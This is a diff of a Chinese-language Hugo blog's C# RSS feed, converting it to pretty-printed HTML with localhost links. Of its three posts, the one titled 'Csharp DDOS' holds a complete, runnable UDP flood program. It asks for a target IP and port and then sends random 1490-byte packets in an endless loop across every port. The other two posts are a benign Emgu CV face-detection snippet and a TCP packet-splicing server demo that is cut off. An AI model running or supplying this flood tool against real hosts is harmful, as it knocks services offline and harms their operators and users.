@@ -1,8 +1,189 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Csharp on MLOG</title><link>https://qfsyso.github.io/tags/csharp/</link><description>Recent content in Csharp on MLOG</description><generator>Hugo -- 0.126.3</generator><language>zh-CN</language><lastBuildDate>Wed, 11 Dec 2024 21:19:04 +0000</lastBuildDate><atom:link href="https://qfsyso.github.io/tags/csharp/index.xml" rel="self" type="application/rss+xml"/><item><title>Csharp DDOS</title><link>https://qfsyso.github.io/posts/csharp-ddos/</link><pubDate>Wed, 11 Dec 2024 21:19:04 +0000</pubDate><guid>https://qfsyso.github.io/posts/csharp-ddos/</guid><description>UDP 包发 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class Program { static void Main(string[] args) { Console.Clear(); Console.WriteLine(&amp;#34;UDP Flood Attack&amp;#34;); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write(&amp;#34;IP Target : &amp;#34;); string ip = Console.ReadLine(); Console.Write(&amp;#34;Port : &amp;#34;); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine(&amp;#34;Attack Starting&amp;#34;); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) { try { udpClient.</description></item><item><title>cashrp opencv</title><link>https://qfsyso.github.io/posts/cashrp-opencv/</link><pubDate>Tue, 03 Dec 2024 01:15:38 +0000</pubDate><guid>https://qfsyso.github.io/posts/cashrp-opencv/</guid><description>Emgu CV进行基本的人脸检测。 人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。
-安装 Emgu CV 首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：
-打开的C#项目。 右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。
-搜索并安装Emgu.CV和Emgu.CV.runtime.windows。 // 加载人脸检测分类器 CascadeClassifier faceCascade = new CascadeClassifier(&amp;#34;haarcascade_frontalface_default.xml&amp;#34;); // 读取输入图像 Image&amp;lt;Bgr, byte&amp;gt; inputImage = new Image&amp;lt;Bgr, byte&amp;gt;(&amp;#34;face.jpg&amp;#34;); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image&amp;lt;Gray, byte&amp;gt; grayImage = inputImage.Convert&amp;lt;Gray, byte&amp;gt;(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save(&amp;#34;output.jpg&amp;#34;); Console.WriteLine(&amp;#34;save~output.jpg&amp;#34;); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades
-runtime 如果没有 Emgu.CV.runtime.windows 则会加载不了xml</description></item><item><title>packet splicing</title><link>https://qfsyso.github.io/posts/packet-splicing/</link><pubDate>Wed, 27 Nov 2024 22:46:43 +0000</pubDate><guid>https://qfsyso.github.io/posts/packet-splicing/</guid><description>模拟粘包的场景 粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。
-使用固定分隔符或包头+包体 常见的解决粘包方案是使用分隔符（如 \n 或特殊字符），或采用固定的包头标识数据长度。
-服务端代码
-using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class TcpServer { static void Main() { TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(&amp;#34;Server started, waiting for connection...&amp;#34;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(&amp;#34;Client connected!&amp;#34;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) &amp;gt; 0) { string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($&amp;#34;Received: {receivedData}&amp;#34;); // 模拟数据未分包的场景 Console.WriteLine(&amp;#34;Processing received data...&amp;#34;); string[] messages = receivedData.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Csharp on MLOG</title>
+    <link>http://localhost:1313/tags/csharp/</link>
+    <description>Recent content in Csharp on MLOG</description>
+    <generator>Hugo -- 0.145.0</generator>
+    <language>zh-CN</language>
+    <lastBuildDate>Wed, 11 Dec 2024 21:19:04 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/csharp/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Csharp DDOS</title>
+      <link>http://localhost:1313/posts/csharp-ddos/</link>
+      <pubDate>Wed, 11 Dec 2024 21:19:04 +0000</pubDate>
+      <guid>http://localhost:1313/posts/csharp-ddos/</guid>
+      <description>&lt;h1 id=&#34;udp-包发&#34;&gt;UDP 包发&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Net;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Net.Sockets;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Text;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Threading;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Program&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Main(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;[] args)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.Clear();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UDP Flood Attack&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.WriteLine();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 获取目标 IP 和端口&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.Write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IP Target : &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; ip = Console.ReadLine();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.Write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Port      : &amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; port = &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;.Parse(Console.ReadLine());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 准备 UDP 客户端&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        UdpClient udpClient = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; UdpClient();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] bytes = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1490&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Random().NextBytes(bytes); &lt;span style=&#34;color:#75715e&#34;&gt;// 生成随机字节数据&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 模拟进度条&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.Clear();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attack Starting&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ShowProgressBar();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 开始发送 UDP 数据包&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; sent = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                udpClient.Send(bytes, bytes.Length, ip, port);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                sent++;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#34;Sent {sent} packets to {ip} through port: {port}&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#75715e&#34;&gt;// 增加端口号&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                port++;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (port &amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65534&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    port = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception ex)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;$&amp;#34;Error: {ex.Message}&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; ShowProgressBar()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;[] delays = { &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;[] progress = {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[                    ] 0% &amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[=====               ] 25%&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[==========          ] 50%&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[===============     ] 75%&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[====================] 100%&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &amp;lt; progress.Length; i++)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Console.WriteLine(progress[i]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &amp;lt; delays.Length)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                Thread.Sleep(delays[i] * &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// 模拟延迟&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;UDP 数据包发送：&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>cashrp opencv</title>
+      <link>http://localhost:1313/posts/cashrp-opencv/</link>
+      <pubDate>Tue, 03 Dec 2024 01:15:38 +0000</pubDate>
+      <guid>http://localhost:1313/posts/cashrp-opencv/</guid>
+      <description>&lt;h1 id=&#34;emgu-cv进行基本的人脸检测&#34;&gt;Emgu CV进行基本的人脸检测。&lt;/h1&gt;
+&lt;p&gt;人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。&lt;/p&gt;
+&lt;h1 id=&#34;安装-emgu-cv&#34;&gt;安装 Emgu CV&lt;/h1&gt;
+&lt;p&gt;首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：&lt;/p&gt;
+&lt;p&gt;打开的C#项目。
+右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。&lt;/p&gt;
+&lt;h2 id=&#34;搜索并安装emgucv和emgucvruntimewindows&#34;&gt;搜索并安装Emgu.CV和Emgu.CV.runtime.windows。&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 加载人脸检测分类器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CascadeClassifier faceCascade = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; CascadeClassifier(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;haarcascade_frontalface_default.xml&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 读取输入图像&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Image&amp;lt;Bgr, &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt; inputImage = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Image&amp;lt;Bgr, &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;face.jpg&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 转换为灰度图像，因为人脸检测通常在灰度图像上进行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Image&amp;lt;Gray, &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt; grayImage = inputImage.Convert&amp;lt;Gray, &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 进行人脸检测&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, &lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, Size.Empty);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 在检测到的人脸周围绘制矩形框&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; (Rectangle face &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; faces)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            inputImage.Draw(face, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Bgr(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 保存标记后的图像为output.jpg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        inputImage.Save(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output.jpg&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Console.WriteLine(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;save~output.jpg&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;xml来自 &lt;a href=&#34;https://github.com/opencv/opencv/tree/master/data/haarcascades&#34;&gt;https://github.com/opencv/opencv/tree/master/data/haarcascades&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;runtime&#34;&gt;runtime&lt;/h2&gt;
+&lt;p&gt;如果没有 Emgu.CV.runtime.windows  则会加载不了xml&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>packet splicing</title>
+      <link>http://localhost:1313/posts/packet-splicing/</link>
+      <pubDate>Wed, 27 Nov 2024 22:46:43 +0000</pubDate>
+      <guid>http://localhost:1313/posts/packet-splicing/</guid>
+      <description>&lt;h1 id=&#34;模拟粘包的场景&#34;&gt;模拟粘包的场景&lt;/h1&gt;
+&lt;p&gt;粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。&lt;/p&gt;
+&lt;h1 id=&#34;使用固定分隔符或包头包体&#34;&gt;使用固定分隔符或包头+包体&lt;/h1&gt;
+&lt;p&gt;常见的解决粘包方案是使用分隔符（如 \n 或特殊字符），或采用固定的包头标识数据长度。&lt;/p&gt;
+&lt;p&gt;服务端代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Net;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Net.Sockets;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Text;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; System.Threading;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TcpServer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
